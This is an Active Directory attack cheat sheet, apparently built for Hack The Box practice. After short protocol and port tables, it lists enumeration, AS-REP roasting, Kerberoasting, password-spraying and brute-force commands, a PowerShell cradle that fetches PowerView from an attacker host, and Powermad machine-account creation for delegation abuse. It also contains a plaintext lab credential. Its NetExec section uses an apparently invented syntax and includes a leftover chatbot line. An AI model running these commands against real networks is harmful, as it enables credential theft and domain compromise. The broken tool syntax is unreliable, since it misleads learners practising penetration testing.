# ACTIVE DIRECTORY METHODOLOGY

---

### 🔧 **WMI – Windows Management Instrumentation**

* **What it is:** A Microsoft technology for remote management and monitoring of Windows systems.
* **What it does:** Lets administrators gather information (like running processes, disk usage, software installed) and perform actions (like starting services) on remote Windows machines.

---

### 🔗 **RPC – Remote Procedure Call**

* **What it is:** A communication method that allows a program to execute code or functions on another computer.
* **What it does:** Powers many Windows services, like WMI, Active Directory replication, and file sharing, by allowing them to talk over the network.

---

### 📂 **LDAP – Lightweight Directory Access Protocol**

* **What it is:** A protocol used to access and manage directory information.
* **What it does:** It's how computers, applications, and users search for and manage data in Active Directory (like usernames, groups, computers, etc.).

---

### 🧠 **MSSQL – Microsoft SQL Server**

* **What it is:** A database management system developed by Microsoft.
* **What it does:** Stores and manages data. In AD environments, it might be used for applications that rely on databases, like SCCM or internal apps.

---

### 💻 **RDP – Remote Desktop Protocol**

* **What it is:** A Microsoft protocol for remote access to the desktop of another Windows system.
* **What it does:** Allows you to log into and control a remote Windows computer as if you were sitting in front of it.

---

### 🌐 **DNS – Domain Name System**

* **What it is:** The internet’s phonebook that translates names (like `server1.ad.local`) into IP addresses.
* **What it does:** AD depends on DNS to find domain controllers, resolve computer names, and ensure the environment functions correctly.

---

### 📡 **WinRM – Windows Remote Management**

* **What it is:** A Microsoft implementation of a web-based management protocol.
* **What it does:** Used for secure remote management, particularly by PowerShell scripts and automation tools.

---

### 🔐 **Kerberos**

* **What it is:** A secure authentication protocol used by Active Directory.
* **What it does:** Verifies user identities and grants tickets for accessing network resources—like a secure digital passport system.

---


## AD PORTs

Comprehensive list of **common ports used in an Active Directory (AD) environment**, including their associated services and what they are used for:

---

### 🔒 **Authentication & Directory Services**

| **Port** | **Protocol** | **Service**        | **Purpose**                                      |
| -------- | ------------ | ------------------ | ------------------------------------------------ |
| 389      | TCP/UDP      | LDAP               | Directory lookups (standard, unencrypted)        |
| 636      | TCP          | LDAPS              | LDAP over SSL/TLS (secure LDAP)                  |
| 88       | TCP/UDP      | Kerberos           | Authentication (tickets issuance and validation) |
| 464      | TCP/UDP      | Kerberos (kpasswd) | Password changes and resets                      |

---

### 🖥️ **Domain Controllers Communication**

| **Port**   | **Protocol** | **Service**         | **Purpose**                                                              |
| ---------- | ------------ | ------------------- | ------------------------------------------------------------------------ |
| 445        | TCP          | SMB/CIFS            | File sharing, Group Policy distribution, SYSVOL and NetLogon shares      |
| 135        | TCP          | RPC Endpoint Mapper | Used by clients to locate dynamic RPC ports                              |
| 1024–65535 | TCP          | RPC (Dynamic)       | Assigned dynamically for services using RPC (e.g., DCOM, AD replication) |
| 139        | TCP          | NetBIOS Session     | Legacy file/printer sharing, NetLogon in older systems                   |

---

### 📤 **Replication & DNS**

| **Port** | **Protocol** | **Service** | **Purpose**                                                          |
| -------- | ------------ | ----------- | -------------------------------------------------------------------- |
| 53       | TCP/UDP      | DNS         | Domain name resolution                                               |
| 445      | TCP          | DFS-R       | Distributed File System Replication                                  |
| 389/636  | TCP          | LDAP/LDAPS  | Also used for AD replication in multi-domain controller environments |

---

### 📨 **Group Policy & Authentication Helpers**

| **Port**    | **Protocol** | **Service**          | **Purpose**                                                  |
| ----------- | ------------ | -------------------- | ------------------------------------------------------------ |
| 3268        | TCP          | Global Catalog       | LDAP queries for multi-domain environments                   |
| 3269        | TCP          | Global Catalog (SSL) | Secure version of GC over LDAPS                              |
| 123         | UDP          | NTP                  | Time synchronization (critical for Kerberos)                 |
| 49152–65535 | TCP          | WMI (RPC Dynamic)    | Windows Management Instrumentation (used in GPO, SCCM, etc.) |

---

### 🧠 **Other Common AD Tools/Services**

| **Port** | **Protocol** | **Service**     | **Purpose**                                        |
| -------- | ------------ | --------------- | -------------------------------------------------- |
| 5985     | TCP          | WinRM           | Remote PowerShell (HTTP)                           |
| 5986     | TCP          | WinRM (HTTPS)   | Secure remote PowerShell                           |
| 9389     | TCP          | AD Web Services | Used by tools like PowerShell for Active Directory |

---

### 🧷 Summary Categories

| **Category**                       | **Ports**              |
| ---------------------------------- | ---------------------- |
| **Core Authentication**            | 88, 464, 389, 636      |
| **Domain Services & File Sharing** | 135, 445, 139          |
| **Replication & GC**               | 389, 636, 3268, 3269   |
| **DNS & Time Sync**                | 53, 123                |
| **Remote Admin / WMI**             | 135, 49152+, 5985/5986 |
| **Misc Tools / Web Services**      | 9389                   |

---



## SMB Enum [port 445, 139]
smbmap -H $ip
smbclient -L //$IP/
smbclient -L //$IP/share -c "recurse,ls"
enum4linux -a $IP
smbexec


## RPC ENum [port 135]
rpcclient -U 'CICADA.htb/' $IP
rpcclient -U '' -N $IP
  enumdomusers
  enumdomgroups
  lookupnames administrator
  lookupsid $SID
  queryuser marko
rpcdump.py
rpcmap.py

## NP USERS 
impacket-GetNPUsers -dc-ip $IP -request 'htb.local/' -no-pass
sudo ntpdate $IP
impacket-GetUserSPNs -request -dc-ip $IP dc.htb/SVC_TGS:$password[cpassword]

## WinRM [only when we have creds and Webserver Microsoft HTTPAPI]
evil-winrm -i $IP -u $USERNAME


## GPP Decryption [cpassword, kerberoasting]
gpp-decrypt $password


## KerbRute
kerbrute userenum -d megabank.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP

# LDAPSEARCH
# Anonymous LDAP enumeration (without credentials)
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=com"
ldapsearch -H ldap://$IP -x -s base namingcontext
ldapsearch -H ldap://$IP -x -b"DC=htb,DC=local" "(objectClass=User)" 'sAMAccountName' | grep sAMAccountName

# LDAP enumeration with credentials
ldapsearch -x -H ldap://<IP> -D "<user>@<domain>" -w "<password>" -b "dc=<domain>,dc=com"
ldapsearch -LLL -H ldap://<IP> -D "<user>@<domain>" -w "<password>" -b "dc=<domain>,dc=com" "(objectClass=*)" | tee ldap_results.txt

# Crackmapexec (CME)
# Basic enumeration without credentials
crackmapexec smb <IP> --shares
crackmapexec smb <IP> --users

# With credentials
crackmapexec smb <IP> -u "<username>" -p "<password>" --shares
crackmapexec smb <IP> -u "<username>" -p "<password>" --groups
crackmapexec ldap <IP> -u "<username>" -p "<password>" --kdc-host <DC_IP> --asreproast

# PowerShell
# PowerView enumeration (Import PowerView.ps1 first)
# Load the script in memory
iex(new-object net.webclient).downloadstring('http://<attacker-ip>/PowerView.ps1')

# Get domain info
Get-NetDomain
Get-NetForest
Get-NetUser | Select Name, SamAccountName
Get-NetComputer | Select Name

# Find group policy objects (GPO)
Get-NetGPO | Select DisplayName

# Kerberoastable users
Get-DomainUser -SPN

# Find writable shares
Find-DomainShare -Verbose

# Group membership enumeration
Get-DomainGroupMember -Identity "<group-name>" | Select MemberName

# BloodHound data collection
Invoke-BloodHound -CollectionMethod All -Verbose

# NetExec (NXC)
# Anonymous enumeration
nxc.exe /net:<target_ip> /shares
nxc.exe /net:<target_ip> /sessions

# With credentials
nxc.exe /net:<target_ip> /user:<domain>\<username> /pass:<password> /shares
nxc.exe /net:<target_ip> /user:<domain>\<username> /pass:<password> /sessions
Here is the response in a code preview pane format for easy copying:

```plaintext
MSSQL

- nxc mssql /discover
- nxc mssql /net:<target_ip> /user:<domain>\<username> /pass:<password> /test
- nxc mssql /net:<target_ip> /user:<domain>\<username> /pass:<password> /query:"SELECT @@version"
- nxc mssql /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

SMB
- nxc smb $IP -u '.' -p '' --rid-brute
- nxc smb /net:<target_ip> --shares
- nxc smb $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
- nxc smb $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
- nxc smb /net:<target_ip> /share:<sharename> /user:<domain>\<username> /pass:<password> /list
- nxc smb /net:<target_ip> /share:<sharename> /user:<domain>\<username> /pass:<password> /get:file.txt
- nxc smb /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

FTP

- nxc ftp /net:<target_ip> /anon
- nxc ftp /net:<target_ip> /user:<username> /pass:<password> /list
- nxc ftp /net:<target_ip> /user:<username> /pass:<password> /get:file.txt
- nxc ftp /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

LDAP

- nxc ldap /net:<target_ip> /query
- nxc ldap /net:<target_ip> /user:<username> /pass:<password> /query:"(objectClass=user)"
- nxc ldap /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

RDP

- nxc rdp /net:<target_ip> /check
- nxc rdp /net:<target_ip> /user:<domain>\<username> /pass:<password> /test
- nxc rdp /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

SSH

- nxc ssh /net:<target_ip> /user:<username> /pass:<password> /test
- nxc ssh /net:<target_ip> /user:<username> /pass:<password> /list
- nxc ssh /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

VNC

- nxc vnc /net:<target_ip> /test
- nxc vnc /net:<target_ip> /pass:<password> /test
- nxc vnc /net:<target_ip> /passfile:<passwordfile_path> /bruteforce

WINRM

- nxc winrm /net:<target_ip> /check
- nxc winrm /net:<target_ip> /user:<domain>\<username> /pass:<password> /cmd:"whoami"
- nxc winrm /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce

WMI

- nxc wmi /net:<target_ip> /user:<domain>\<username> /pass:<password> /query:"SELECT * FROM Win32_OperatingSystem"
- nxc wmi /net:<target_ip> /user:<domain>\<username> /pass:<password> /exec:"cmd.exe /c whoami"
- nxc wmi /net:<target_ip> /userfile:<userfile_path> /passfile:<passwordfile_path> /bruteforce
```

# Privilege Escalations
## Using PowerView.ps1 to normal use of powershell
- uploading via upload, curl, Invoke-WebReQuest
- . ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

## Adding a new computer object with PowerMad
- . ./Powermad.ps1

New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
- verify if machine was added
Get-ADComputer -identity FAKE-COMP01









